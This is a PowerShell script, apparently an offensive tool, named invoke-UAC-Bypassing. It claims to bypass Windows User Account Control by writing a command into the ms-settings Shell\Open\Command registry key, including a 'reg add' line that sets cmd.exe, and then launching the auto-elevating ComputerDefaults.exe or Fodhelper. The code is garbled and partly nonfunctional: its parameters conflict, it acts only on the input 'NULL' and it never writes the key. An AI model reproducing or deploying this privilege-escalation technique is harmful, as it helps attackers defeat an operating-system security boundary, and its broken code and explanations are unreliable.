function invoke-UAC-Bypassing {

<#
 Author   @matthomjxi0e
 Licence  BSD3
 Required Dependencies: None
 Optional Dependencies: None
 

.Synopsis
this lllustrates operations Bypassing UAC using Storage new in HKLM On Registry
every this Comes precisely from this location this => Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Classes\ms-settings\Shell\Open


.Description
 This is Operation, I Knew this Her using IDA ! FOr Operation Storage program Fodhelper in ( HKLM ) Only 
 using Method invoke the Executeion in commands in Fodhelper.exe /regserver With /Open 


.Example
PS:> invoke-UAC-Bypassing -CommandEx cmd.exe
.Note 
Add First Value Execute:>  reg add HKLM\SOFTWARE\Classes\ms-settings\Shell\Open\Command /t REG_SZ /d cmd.exe

#>

    [CmdletBinding(SupportsPaging = $true)]    
    param( 
            [Parameter(Mandatory=$True,Position=0)]

                [parameter(Mandatory=$true,ParameterSetName="NULL")]
   
                             [String]$CommandEx,$Stack
)

 if ($CommandEx -like "NULL") {
    Write-Host ""
    Write-Host ""
    Write-Host -Object "[*] Operation Access For Execute FR TESTING EX " -ForegroundColor Yellow
    sleep 1
    Write-Host ""
    Write-Host ""
    Write-Host -Object "[*] Operation UAC Access in Location " -ForegroundColor Yellow
    sleep 1
    Write-Host ""
    Write-Host ""
    Write-Host -Object "[*] Operation Access in Storage Program" -ForegroundColor Yellow
   
     $EnableAccessStorage = ComputerDefaults.exe  /RegServer
     $AccessAgain = ComputerDefaults.exe  /open
} 

}
